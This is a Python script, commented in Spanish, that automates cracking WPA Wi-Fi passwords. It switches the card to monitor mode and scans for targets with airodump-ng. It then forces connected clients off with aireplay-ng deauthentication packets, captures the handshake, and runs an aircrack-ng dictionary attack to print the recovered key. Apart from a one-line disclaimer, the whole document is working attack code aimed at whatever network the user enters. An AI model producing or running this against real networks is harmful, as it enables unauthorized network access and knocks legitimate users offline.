# wificrack.py
#
# ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
# únicamente en redes para las que se tiene permiso explícito.
# El uso no autorizado es ilegal.

import os
import subprocess
import time
import sys
import re

def check_root():
    """Verifica si el script se está ejecutando como root."""
    if os.geteuid() != 0:
        print("\n[!] Error: Este script requiere privilegios de superusuario (root).")
        print("    Por favor, ejecútalo con 'sudo python3 wifi_auditor.py'")
        sys.exit(1)

def find_wireless_interface():
    """Encuentra la primera interfaz de red inalámbrica disponible."""
    try:
        # Usamos 'iw dev' que es más moderno que 'iwconfig'
        result = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT).decode('utf-8')
        interfaces = re.findall(r'Interface\s+(\w+)', result)
        if not interfaces:
            print("[!] No se encontró ninguna interfaz de red inalámbrica.")
            sys.exit(1)
        # Tomamos la primera interfaz encontrada (ej. wlan0, wlp2s0)
        return interfaces[0]
    except FileNotFoundError:
        print("[!] Error: El comando 'iw' no se encontró. ¿Estás en Linux con las herramientas inalámbricas instaladas?")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Ocurrió un error al buscar interfaces: {e}")
        sys.exit(1)

def set_monitor_mode(interface):
    """Activa el modo monitor en la interfaz especificada."""
    print(f"\n[*] Activando modo monitor en la interfaz {interface}...")
    try:
        # Es más robusto usar ip/iw que ifconfig/iwconfig
        subprocess.run(['ifconfig', interface, 'down'], check=True)
        subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
        subprocess.run(['ifconfig', interface, 'up'], check=True)
        print(f"[+] Modo monitor activado en {interface}.")
        return f"{interface}" # A veces el nombre cambia a wlan0mon, pero con iwconfig/ifconfig suele mantenerse.
    except subprocess.CalledProcessError:
        print(f"[!] Error al activar el modo monitor. Asegúrate de que tu tarjeta sea compatible.")
        sys.exit(1)

def stop_monitor_mode(interface):
    """Desactiva el modo monitor y restaura la interfaz."""
    print(f"\n[*] Desactivando modo monitor en {interface}...")
    try:
        subprocess.run(['ifconfig', interface, 'down'], check=True)
        subprocess.run(['iwconfig', interface, 'mode', 'managed'], check=True)
        subprocess.run(['ifconfig', interface, 'up'], check=True)
        print("[+] Modo monitor desactivado. Conectando a servicios de red...")
        # Reiniciar NetworkManager puede ayudar a reconectar automáticamente
        subprocess.run(['systemctl', 'start', 'NetworkManager'], check=False)
        print("[+] Interfaz restaurada.")
    except subprocess.CalledProcessError:
        print(f"[!] Error al desactivar el modo monitor. Puede que necesites hacerlo manualmente.")

def capture_handshake(interface, bssid, channel):
    """Inicia airodump-ng para capturar el handshake."""
    print(f"\n[*] Iniciando captura en el canal {channel} para el BSSID {bssid}.")
    print("    Presiona Ctrl+C cuando veas '[WPA handshake: ...]' en la esquina superior derecha.")
    
    # Creamos un nombre de archivo para la captura
    output_prefix = "handshake_capture"
    command = [
        'airodump-ng',
        '--bssid', bssid,
        '--channel', channel,
        '--write', output_prefix,
        interface
    ]

    try:
        # airodump se ejecutará hasta que el usuario lo detenga
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Mientras tanto, podemos realizar un ataque de desautenticación para acelerar
        deauth_target(interface, bssid)

        process.wait() # Espera a que el usuario termine airodump
    except KeyboardInterrupt:
        print("\n[+] Captura detenida por el usuario.")
    
    # Buscamos el archivo .cap que se generó
    capture_file = f"{output_prefix}-01.cap"
    if os.path.exists(capture_file):
        print(f"[+] Handshake posiblemente capturado en '{capture_file}'.")
        return capture_file
    else:
        print("[!] No se encontró el archivo de captura. Es posible que el handshake no se haya capturado.")
        return None

def deauth_target(interface, bssid):
    """Envía paquetes de desautenticación para forzar la reconexión."""
    print("\n[*] Intentando acelerar la captura con un ataque de desautenticación.")
    print("    Enviando 10 paquetes deauth. Esto forzará a los clientes a reconectarse.")
    command = [
        'aireplay-ng',
        '--deauth', '10', # Número de paquetes
        '-a', bssid,      # BSSID del punto de acceso
        interface
    ]
    try:
        subprocess.run(command, check=True, timeout=20, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] Paquetes de desautenticación enviados.")
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        print(f"[!] El ataque de desautenticación falló. Puede que no haya clientes conectados o estés fuera de alcance. {e}")

def crack_password(capture_file, wordlist):
    """Usa aircrack-ng para realizar un ataque de diccionario."""
    if not os.path.exists(wordlist):
        print(f"[!] Error: La lista de contraseñas '{wordlist}' no existe.")
        return

    print(f"\n[*] Iniciando ataque de diccionario sobre '{capture_file}' usando '{wordlist}'.")
    print("    Esto puede tardar mucho tiempo dependiendo del tamaño de la lista y la potencia de tu CPU.")
    
    command = [
        'aircrack-ng',
        '-w', wordlist,
        '-b', bssid_target, # Necesitamos el bssid para filtrar
        capture_file
    ]
    
    try:
        result = subprocess.check_output(command).decode('utf-8')
        print("\n--- Resultados de Aircrack-ng ---")
        print(result)
        
        if "KEY FOUND!" in result:
            password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', result)
            if password:
                print("\n" + "="*40)
                print(f"    ¡ÉXITO! Contraseña encontrada: {password.group(1)}")
                print("="*40 + "\n")
        else:
            print("\n" + "="*40)
            print("    Contraseña no encontrada en el diccionario proporcionado.")
            print("="*40 + "\n")

    except subprocess.CalledProcessError as e:
        # Aircrack devuelve un código de error si no encuentra la clave, por lo que manejamos la salida.
        output = e.output.decode('utf-8')
        if "KEY FOUND!" in output:
             password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', output)
             if password:
                print("\n" + "="*40)
                print(f"    ¡ÉXITO! Contraseña encontrada: {password.group(1)}")
                print("="*40 + "\n")
        else:
            print("\n[!] Aircrack-ng terminó. Contraseña no encontrada en el diccionario.")


if __name__ == "__main__":
    check_root()
    
    interface = find_wireless_interface()
    
    # Escaneo de redes
    print(f"[*] Usando la interfaz: {interface}")
    print("[*] Presiona Ctrl+C para detener el escaneo y seleccionar un objetivo.")
    try:
        # Usamos Popen para poder detenerlo con Ctrl+C sin terminar el script principal
        scan_process = subprocess.Popen(['airodump-ng', interface], stdout=sys.stdout, stderr=sys.stderr)
        scan_process.wait()
    except KeyboardInterrupt:
        print("\n[+] Escaneo detenido.")

    # Solicitar datos del objetivo
    bssid_target = input("\n> Introduce el BSSID del objetivo: ").strip()
    channel_target = input("> Introduce el CANAL del objetivo: ").strip()
    wordlist_path = input("> Introduce la ruta a tu lista de contraseñas (ej. /usr/share/wordlists/rockyou.txt): ").strip()
    
    monitor_interface = set_monitor_mode(interface)
    
    try:
        capture_file_path = capture_handshake(monitor_interface, bssid_target, channel_target)
        
        if capture_file_path:
            crack_password(capture_file_path, wordlist_path)
            
    finally:
        # Asegurarnos de que el modo monitor siempre se desactive
        stop_monitor_mode(monitor_interface)
        print("\n[*] Proceso finalizado.")
